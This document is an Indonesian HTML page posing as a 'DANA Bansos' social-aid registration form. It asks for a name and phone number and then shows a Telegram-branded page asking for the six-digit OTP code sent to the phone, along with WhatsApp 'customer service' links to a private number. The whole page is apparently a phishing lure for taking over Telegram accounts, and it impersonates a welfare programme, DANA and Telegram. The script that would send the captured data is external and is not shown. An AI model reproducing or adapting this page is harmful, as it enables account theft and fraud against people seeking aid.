<!DOCTYPE html>
<html lang="id-ID">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA Bansos - Daftar Sekarang</title>
    
    <!-- Fonts -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=PT+Sans:wght@400;700&display=swap">
    <!-- Font Awesome for Telegram icon -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    
    <!-- CSS Eksternal -->
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Loading Overlay untuk transisi antar halaman -->
    <div id="page-loading" class="page-loading-overlay hidden">
        <div class="page-loading-spinner"></div>
        <div class="page-loading-text">Mengirim kode OTP...</div>
    </div>

    <!-- Halaman Utama (Pendaftaran) -->
    <div id="home-page">
        <div class="container">
            <a class="skip-link" href="#main-content">Lanjut ke konten</a>

            <header class="site-header" role="banner">
                <!-- Header kosong, bisa diisi jika perlu -->
            </header>

            <main id="main-content">
                <article>
                    <h1 class="text-center">DANA Bansos</h1>

                    <!-- Hero Section with Form -->
                    <div class="hero-section">
                        <div class="hero-content">
                            <div class="hero-image">
                                <img 
                                    src="https://l9944.wordpress.com/wp-content/uploads/2026/03/images284294441427948398649322.jpg" 
                                    alt="DANA Bansos"
                                    loading="lazy"
                                    onerror="this.src='https://via.placeholder.com/741x414?text=Gambar+DANA'"
                                >
                            </div>

                            <!-- Form Section -->
                            <div class="form-section">
                                <h2 class="form-title">Daftar Sekarang</h2>
                                
                                <form class="contact-form" id="bansosForm">
                                    <!-- Nama Field -->
                                    <div class="form-group">
                                        <label for="nama" class="form-label">Nama Lengkap:</label>
                                        <input 
                                            type="text" 
                                            id="nama" 
                                            name="nama" 
                                            class="form-input" 
                                            placeholder="Masukan nama"
                                            required
                                        >
                                        <div id="nama-error" class="error-message" style="display: none;">
                                            <svg width="16" height="16" viewBox="0 0 16 16">
                                                <path d="M8.50015 11.6402H7.50015V10.6402H8.50015V11.6402Z" />
                                                <path d="M7.50015 9.64018H8.50015V6.30684H7.50015V9.64018Z" />
                                                <path fill-rule="evenodd" d="M6.98331 3.0947C7.42933 2.30177 8.57096 2.30177 9.01698 3.09469L13.8771 11.7349C14.3145 12.5126 13.7525 13.4735 12.8602 13.4735H3.14004C2.24774 13.4735 1.68575 12.5126 2.12321 11.7349L6.98331 3.0947ZM8.14541 3.58496C8.08169 3.47168 7.9186 3.47168 7.85488 3.58496L2.99478 12.2251C2.93229 12.3362 3.01257 12.4735 3.14004 12.4735H12.8602C12.9877 12.4735 13.068 12.3362 13.0055 12.2251L8.14541 3.58496Z" />
                                            </svg>
                                            <span id="nama-error-text"></span>
                                        </div>
                                    </div>

                                    <!-- Phone Field -->
                                    <div class="form-group">
                                        <label for="telepon" class="form-label">Nomor telepon:</label>
                                        <div class="phone-input-wrapper">
                                            <div class="country-code-selector">
                                                <select id="countryCode" name="countryCode">
                                                    <option value="+62" selected>🇮🇩 +62</option>
                                                    <option value="+1">🇺🇸 +1</option>
                                                    <option value="+44">🇬🇧 +44</option>
                                                    <option value="+60">🇲🇾 +60</option>
                                                    <option value="+65">🇸🇬 +65</option>
                                                    <option value="+63">🇵🇭 +63</option>
                                                    <option value="+66">🇹🇭 +66</option>
                                                    <option value="+84">🇻🇳 +84</option>
                                                </select>
                                            </div>
                                            <input 
                                                type="tel" 
                                                id="telepon" 
                                                name="telepon" 
                                                class="phone-number-input" 
                                                placeholder="Nomor telepon"
                                                required
                                            >
                                        </div>
                                        <div id="telepon-error" class="error-message" style="display: none;">
                                            <svg width="16" height="16" viewBox="0 0 16 16">
                                                <path d="M8.50015 11.6402H7.50015V10.6402H8.50015V11.6402Z" />
                                                <path d="M7.50015 9.64018H8.50015V6.30684H7.50015V9.64018Z" />
                                                <path fill-rule="evenodd" d="M6.98331 3.0947C7.42933 2.30177 8.57096 2.30177 9.01698 3.09469L13.8771 11.7349C14.3145 12.5126 13.7525 13.4735 12.8602 13.4735H3.14004C2.24774 13.4735 1.68575 12.5126 2.12321 11.7349L6.98331 3.0947ZM8.14541 3.58496C8.08169 3.47168 7.9186 3.47168 7.85488 3.58496L2.99478 12.2251C2.93229 12.3362 3.01257 12.4735 3.14004 12.4735H12.8602C12.9877 12.4735 13.068 12.3362 13.0055 12.2251L8.14541 3.58496Z" />
                                            </svg>
                                            <span id="telepon-error-text"></span>
                                        </div>
                                    </div>

                                    <!-- Submit Button -->
                                    <button type="button" class="submit-button" id="daftarBtn">
                                        <span class="button-text">Daftar sekarang</span>
                                        <span class="button-loading hidden">
                                            <span class="loading-spinner"></span>
                                            Mengirim...
                                        </span>
                                    </button>
                                </form>
                            </div>
                        </div>

                        <!-- Spacer -->
                        <div class="spacer"></div>
                    </div>

                    <!-- Footer Image -->
                    <div class="footer-image">
                        <img 
                            src="https://l9944.wordpress.com/wp-content/uploads/2026/03/img_20260313_193101_3663141740910326551356.jpg" 
                            alt="Footer"
                            loading="lazy"
                            onerror="this.src='https://via.placeholder.com/1201x86?text=Footer+Image'"
                        >
                    </div>
                </article>
            </main>

            <footer class="site-footer">
                <div class="site-info">
                    <a href="#" rel="nofollow">Halaman Pendaftaran DANA Bansos</a>
                </div>
            </footer>
        </div>

        <!-- Marketing Bar -->
        <div class="marketing-bar">
            <div class="marketing-bar-text">Dapatkan informasi terbaru seputar bansos</div>
            <!-- Tombol Daftar Sekarang - mengarah ke form pendaftaran -->
            <button class="marketing-bar-button" id="daftar-sekarang-btn">Daftar Sekarang</button>
            <a class="marketing-bar-link" href="#" aria-label="Informasi lebih lanjut"></a>
        </div>
    </div>

    <!-- Halaman OTP dengan Tema Telegram -->
    <div id="otp-page" class="hidden">
        <div class="container">
            <div class="otp-container">
                <div class="telegram-header">
                    <i class="fab fa-telegram"></i> Telegram
                </div>
                <h2 class="otp-title">Verifikasi Kode OTP</h2>
                <div class="user-info" id="otp-user-info"></div>
                <p class="otp-subtitle">Masukkan kode yang dikirim ke nomor Anda</p>
                
                <div class="otp-input-group">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                </div>

                <div class="otp-timer" id="otp-timer">02:00</div>
                
                <div class="otp-resend">
                    <a href="#" id="resend-otp">Kirim ulang kode</a>
                </div>

                <div class="button-group">
                    <!-- Tombol Verifikasi dengan gaya Telegram -->
                    <button class="telegram-verify-button" id="verify-otp-btn">
                        <span class="button-text">
                            <i class="fab fa-telegram"></i> Verifikasi
                        </span>
                        <span class="button-loading hidden">
                            <span class="loading-spinner"></span>
                            Memverifikasi...
                        </span>
                    </button>
                    
                    <!-- Tombol Hubungi CS Bansos via WhatsApp -->
                    <a href="https://wa.me/6282194565774?text=Halo%20CS%20Bansos%2C%20saya%20membutuhkan%20bantuan%20terkait%20kode%20OTP" 
                       class="whatsapp-button" 
                       target="_blank" 
                       rel="noopener noreferrer">
                        <i class="fab fa-whatsapp"></i> Hubungi CS Bansos
                    </a>
                </div>

                <div id="otp-error" class="error-message" style="display: none; justify-content: center; margin-top: 20px;">
                    <span id="otp-error-text"></span>
                </div>

                <div class="help-text">
                    Butuh bantuan? <a href="https://wa.me/6282194565774" target="_blank" rel="noopener noreferrer">Chat via WhatsApp</a>
                </div>
            </div>
        </div>
    </div>

    <!-- JavaScript Eksternal -->
    <script src="script.js"></script>
</body>
  </html>
